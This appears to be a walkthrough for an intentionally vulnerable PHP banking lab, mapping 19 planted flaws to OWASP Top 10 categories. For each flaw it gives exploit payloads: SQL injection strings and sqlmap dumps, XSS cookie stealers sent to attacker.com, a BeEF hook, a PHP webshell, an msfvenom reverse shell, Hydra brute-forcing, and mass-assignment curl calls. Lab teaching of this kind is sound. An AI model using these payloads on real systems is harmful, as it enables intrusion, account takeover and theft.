# 🏦 BankLab — OWASP Top 10 Vulnerability Map

> **Lab URL:** `http://localhost/bank-lab-main/`  
> Every vulnerability below is **intentionally planted** for learning.  
> All payloads target localhost only.

---

## A01 — Broken Access Control

### 1️⃣ Admin Panel — No Role Check
| | |
|---|---|
| **File** | `admin.php` line 8–9 |
| **Code** | `if (!isset($_SESSION['user_id'])) { ... }` — only checks login, not role |

**Exploit:** Any logged-in user (alice, bob, carol, dave) can visit the admin panel directly.

```
# Just browse while logged in as any normal user:
http://localhost/bank-lab-main/admin.php
```

**Tool:** Browser — no special tool needed.

---

### 2️⃣ IDOR — Insecure Direct Object Reference (Account & Transactions)
| | |
|---|---|
| **File** | `dashboard.php`, `transactions.php`, `api.php` |
| **Code** | `WHERE accounts.id = $account_id` — account_id comes from URL param, not session |

**Exploit:** Accounts are sequential (101, 102, 103, 104). Change the URL parameter to see other users' data.

```
# View Alice's dashboard (account 101)
http://localhost/bank-lab-main/dashboard.php?account_id=101

# View Bob's transactions (account 102)
http://localhost/bank-lab-main/transactions.php?account_id=102

# Via API — no auth required at all
http://localhost/bank-lab-main/api.php?endpoint=account&id=103
http://localhost/bank-lab-main/api.php?endpoint=transactions&account_id=104
```

**Tool:** **Burp Suite** (Intruder, fuzz `account_id` from 100–200) or simply your browser.

```
# Burp Intruder payload: integers 100 → 200
# Target: GET /bank-lab-main/dashboard.php?account_id=§101§
```

---

## A02 — Cryptographic Failures

### 3️⃣ Plaintext Passwords Stored in Database
| | |
|---|---|
| **File** | `setup.sql` lines 41–45, `admin.php` line 158 |
| **Code** | `INSERT INTO users ... VALUES (1, 'alice', 'password123', ...)` |

**Exploit:** After gaining admin access (A01), the admin panel displays every user's password in plaintext in the table.

```
# Step 1: Go to admin panel
http://localhost/bank-lab-main/admin.php

# Step 2: Password column is visible on screen — no tool needed!
# alice:password123, bob:qwerty999, carol:carol2024, dave:dave1234
```

**Tool:** Browser — passwords are displayed directly on screen.

---

### 4️⃣ Hardcoded API Keys in Source Code
| | |
|---|---|
| **File** | `api.php` lines 19–24 |
| **Code** | `'sk_live_banklab_alice_1a2b3c4d' => 1` |

**Exploit:** Anyone who reads the source code gets working API keys.

```bash
# Use Alice's hardcoded API key
curl -H "X-Api-Key: sk_live_banklab_alice_1a2b3c4d" \
     "http://localhost/bank-lab-main/api.php?endpoint=users"
```

**Tool:** `curl` / **Burp Suite** / **Postman**

---

## A03 — Injection

### 5️⃣ SQL Injection — Login (Classic SQLi)
| | |
|---|---|
| **File** | `login.php` lines 18–22 |
| **Code** | `WHERE users.username = '$username'` — no prepared statement |

**Exploit (Authentication Bypass):**
```
Username: admin' OR '1'='1
Password: anything
```

**Tool:** **sqlmap** for automated extraction:

```bash
# Dump the entire users table via login form
sqlmap -u "http://localhost/bank-lab-main/login.php" \
       --data="username=alice&password=test" \
       --dbms=mysql -D bank_lab -T users --dump
```

---

### 6️⃣ SQL Injection — Search Page (Reflected SQLi)
| | |
|---|---|
| **File** | `search.php` lines 31–33 |
| **Code** | `WHERE t.memo LIKE '%$q%'` — raw GET param in query |

**Exploit:**
```
# In browser URL bar:
http://localhost/bank-lab-main/search.php?q=' UNION SELECT 1,username,password,email FROM users-- -
```

**Tool:** **sqlmap**

```bash
sqlmap -u "http://localhost/bank-lab-main/search.php?q=test" \
       --dbms=mysql -D bank_lab --dump --cookie="PHPSESSID=<your-session>"
```

---

### 7️⃣ SQL Injection — API Search Endpoint (No Auth Required)
| | |
|---|---|
| **File** | `api.php` line 157 |
| **Code** | `WHERE full_name LIKE '%$q%'` — no auth, no escaping |

**Exploit (no login needed!):**
```bash
# Dump all users without any authentication
curl "http://localhost/bank-lab-main/api.php?endpoint=search&q=' UNION SELECT id,username,password,email FROM users-- -"
```

**Tool:** `curl`, **sqlmap**, **Postman**

```bash
sqlmap -u "http://localhost/bank-lab-main/api.php?endpoint=search&q=test" \
       --dbms=mysql -D bank_lab --dump
```

---

### 8️⃣ Reflected XSS — Search Page
| | |
|---|---|
| **File** | `search.php` lines 103, 110 |
| **Code** | `value="<?= $_GET['q'] ?>"` and `<strong><?= $q ?></strong>` — no escaping |

**Exploit:**
```
# Paste in browser:
http://localhost/bank-lab-main/search.php?q=<script>alert('XSS')</script>

# Cookie stealer:
http://localhost/bank-lab-main/search.php?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

**Tool:** Browser, **Burp Suite**, **XSStrike**

```bash
# Automated XSS scanner
xsstrike -u "http://localhost/bank-lab-main/search.php?q=test"
```

---

### 9️⃣ Stored XSS — Transfer Memo Field
| | |
|---|---|
| **File** | `transfer.php` line 27, `search.php` line 134 |
| **Code** | `$memo = $_POST['memo']` stored raw; rendered with `<?= $t['memo'] ?>` |

**Exploit:** Send a transfer with an XSS payload in the memo. It executes for **every user** who views their transactions.

```
# In the transfer form, enter as the memo:
<script>alert('Stored XSS — ' + document.cookie)</script>

# Or a BeEF hook:
<script src="http://attacker.com/hook.js"></script>
```

**Tool:** Browser (manual), **BeEF Framework** (hook victims)

---

## A04 — Insecure Design

### 🔟 Business Logic Flaw — Negative Transfer Amount
| | |
|---|---|
| **File** | `transfer.php` lines 29–36 |
| **Code** | `balance - $amount` — `$amount` is not validated to be positive |

**Exploit:** Send a negative amount to **steal money** from another account.

```
# In the transfer form, enter:
Amount: -500
Recipient: Bob (account 102)

# Result: Bob LOSES $500, you GAIN $500
```

**Tool:** **Burp Suite** (intercept the POST, change `amount=500` to `amount=-500`)

```
POST /bank-lab-main/transfer.php
to_account=102&amount=-500&memo=hacked
```

---

### 1️⃣1️⃣ CSRF — Forced Bank Transfer
| | |
|---|---|
| **File** | `transfer.php` lines 24, 116–117 |
| **Code** | No CSRF token in form. PoC already built in `csrf_poc.html` |

**Exploit:** The lab already includes a ready-made CSRF PoC page!

```
# Step 1: Log in as alice at:
http://localhost/bank-lab-main/login.php

# Step 2: While still logged in, open in the SAME browser:
http://localhost/bank-lab-main/csrf_poc.html

# Result: $500 is automatically transferred from Alice to Bob
#         without Alice clicking anything (auto-submits after 2 seconds)
```

**Tool:** Browser (PoC included). **Burp Suite** CSRF PoC generator for custom attacks.

---

## A05 — Security Misconfiguration

### 1️⃣2️⃣ Sensitive Data Exposure via Admin System Info Panel
| | |
|---|---|
| **File** | `admin.php` lines 196–208 |
| **Code** | `phpversion()`, `PHP_OS`, `$_SERVER['DOCUMENT_ROOT']`, `mysqli_get_server_info()` |

**Exploit:** The admin panel System Info card leaks:
- PHP version (fingerprinting for known CVEs)
- Server OS (Windows/Linux)
- Full document root path (`C:\xampp\htdocs\`)
- MySQL version
- XAMPP server software version

```
http://localhost/bank-lab-main/admin.php
# Scroll to "System Info" card on the right
```

**Tool:** Browser. Use info to find version-specific exploits on [exploit-db.com](https://exploit-db.com)

---

### 1️⃣3️⃣ Wide-Open CORS on API
| | |
|---|---|
| **File** | `api.php` line 11 |
| **Code** | `header('Access-Control-Allow-Origin: *')` |

**Exploit:** Any malicious website can make authenticated API calls on behalf of a logged-in victim.

```javascript
// Evil page running on attacker.com:
fetch('http://localhost/bank-lab-main/api.php?endpoint=balance', {
  credentials: 'include'
}).then(r => r.json()).then(d => sendToAttacker(d));
```

**Tool:** Browser DevTools, or a simple HTML page hosted locally.

---

### 1️⃣4️⃣ Unrestricted File Upload → Remote Code Execution (RCE)
| | |
|---|---|
| **File** | `upload.php` lines 24–28 |
| **Code** | No MIME/extension check. File saved to `/uploads/` with original name |

**Exploit:** Upload a PHP webshell disguised as "photo":

```php
<!-- Create a file named: shell.php -->
<?php system($_GET['cmd']); ?>
```

```
# Step 1: Go to upload page
http://localhost/bank-lab-main/upload.php

# Step 2: Upload shell.php

# Step 3: Execute system commands
http://localhost/bank-lab-main/uploads/shell.php?cmd=whoami
http://localhost/bank-lab-main/uploads/shell.php?cmd=dir
http://localhost/bank-lab-main/uploads/shell.php?cmd=type+C:\xampp\htdocs\bank-lab-main\db.php
```

**Tool:** Browser (manual upload) → then browser or `curl` to execute. **Metasploit** for reverse shell.

```bash
# Metasploit PHP reverse shell payload:
msfvenom -p php/reverse_php LHOST=<your-ip> LPORT=4444 -f raw > shell.php
# Upload it, start listener, access the URL
```

---

## A06 — Vulnerable & Outdated Components

### 1️⃣5️⃣ Server Stack Fingerprinting
The admin panel + HTTP response headers expose full version info:
- Apache/2.x.x / XAMPP
- PHP 8.x
- MySQL 8.x

**Tool:** **Nikto** (automated scanner)

```bash
nikto -h http://localhost/bank-lab-main/
```

---

## A07 — Identification & Authentication Failures

### 1️⃣6️⃣ Username Enumeration via Login Error Messages
| | |
|---|---|
| **File** | `login.php` lines 41–44 |
| **Code** | Two different error messages: `"No account found"` vs `"Incorrect password"` |

**Exploit:**
```
# Test if username exists:
Username: alice  → "Incorrect password"  ← username EXISTS
Username: zzz    → "No account found"    ← username DOES NOT exist
```

**Tool:** **Burp Suite Intruder** — fuzz usernames, filter by response text

```
POST /bank-lab-main/login.php
username=§FUZZ§&password=wrong

# Load a username wordlist, look for "Incorrect password" responses
```

---

### 1️⃣7️⃣ Open Redirect
| | |
|---|---|
| **File** | `login.php` lines 12, 37 |
| **Code** | `$dest = !empty($redirect) ? $redirect : ...` — no validation |

**Exploit (Phishing):**
```
# Send victim this link — after login they land on attacker's site
http://localhost/bank-lab-main/login.php?redirect=http://evil.com/fake-banklab
```

**Tool:** Browser. Can be chained with phishing or XSS.

---

## A08 — Software & Data Integrity Failures

### 1️⃣8️⃣ Mass Assignment — API Profile Update
| | |
|---|---|
| **File** | `api.php` lines 167–173 |
| **Code** | `UPDATE users SET $field = '$value'` — user controls both column name and value |

**Exploit:** Change your own password, take over username, etc.

```bash
# Change your password via the API
curl -X POST \
     -H "X-Api-Key: sk_live_banklab_alice_1a2b3c4d" \
     -H "Content-Type: application/json" \
     -d '{"field":"password","value":"hacked123"}' \
     "http://localhost/bank-lab-main/api.php?endpoint=update_profile"

# Change your username to 'admin'
curl -X POST \
     -H "X-Api-Key: sk_live_banklab_alice_1a2b3c4d" \
     -H "Content-Type: application/json" \
     -d '{"field":"username","value":"admin"}' \
     "http://localhost/bank-lab-main/api.php?endpoint=update_profile"
```

**Tool:** `curl` / **Postman** / **Burp Suite**

---

## A09 — Security Logging & Monitoring Failures

### 1️⃣9️⃣ No Rate Limiting / Brute-Force Protection
No login attempt logging, no rate limiting, no lockout after failed attempts.

**Exploit:** Brute-force passwords freely.

```bash
# Hydra brute-force attack on login
hydra -l alice -P /usr/share/wordlists/rockyou.txt \
      localhost http-post-form \
      "/bank-lab-main/login.php:username=^USER^&password=^PASS^:No account found"
```

**Tool:** **Hydra** / **Burp Suite Intruder**

---

## 🗺️ Quick Reference Table

| # | OWASP Category | Vulnerability | File | Tool |
|---|---|---|---|---|
| 1 | A01 | Admin bypass (no role check) | `admin.php:8` | Browser |
| 2 | A01 | IDOR — account/transaction | `dashboard.php`, `api.php` | Burp Suite |
| 3 | A02 | Plaintext passwords in DB | `setup.sql`, `admin.php:158` | Browser |
| 4 | A02 | Hardcoded API keys | `api.php:19` | curl/Postman |
| 5 | A03 | SQLi — login bypass | `login.php:21` | sqlmap |
| 6 | A03 | SQLi — search page | `search.php:31` | sqlmap |
| 7 | A03 | SQLi — API search (no auth) | `api.php:157` | sqlmap/curl |
| 8 | A03 | Reflected XSS — search | `search.php:110` | XSStrike/Browser |
| 9 | A03 | Stored XSS — memo field | `transfer.php:27` | Browser/BeEF |
| 10 | A04 | Negative transfer (logic flaw) | `transfer.php:32` | Burp Suite |
| 11 | A04 | CSRF — forced transfer | `transfer.php:116` | csrf_poc.html |
| 12 | A05 | Server info disclosure | `admin.php:196` | Browser/Nikto |
| 13 | A05 | Wide-open CORS | `api.php:11` | Browser JS |
| 14 | A05 | Unrestricted file upload → RCE | `upload.php:24` | Browser/Metasploit |
| 15 | A06 | Stack fingerprinting | `admin.php:196` | Nikto |
| 16 | A07 | Username enumeration | `login.php:41` | Burp Intruder |
| 17 | A07 | Open redirect | `login.php:37` | Browser |
| 18 | A08 | Mass assignment via API | `api.php:173` | curl/Postman |
| 19 | A09 | No logging / brute-force protection | `login.php` | Hydra |

---

## 🛠️ Tools Summary

| Tool | Use For |
|---|---|
| **Browser** | Admin bypass, IDOR, XSS, CSRF PoC |
| **Burp Suite** | Intercept, IDOR fuzzing, SQLi, CSRF, Intruder brute-force |
| **sqlmap** | Automated SQL injection & DB dump |
| **curl / Postman** | API attacks (hardcoded keys, mass assignment) |
| **Hydra** | Brute-force login (no lockout) |
| **XSStrike** | Automated XSS discovery |
| **BeEF** | Hook victims via Stored XSS |
| **Nikto** | Automated misconfiguration scanner |
| **Metasploit / msfvenom** | PHP reverse shell via file upload |

---

*Generated for BankLab — Intentionally Vulnerable Banking App*  
*For educational and authorized penetration testing practice only.*
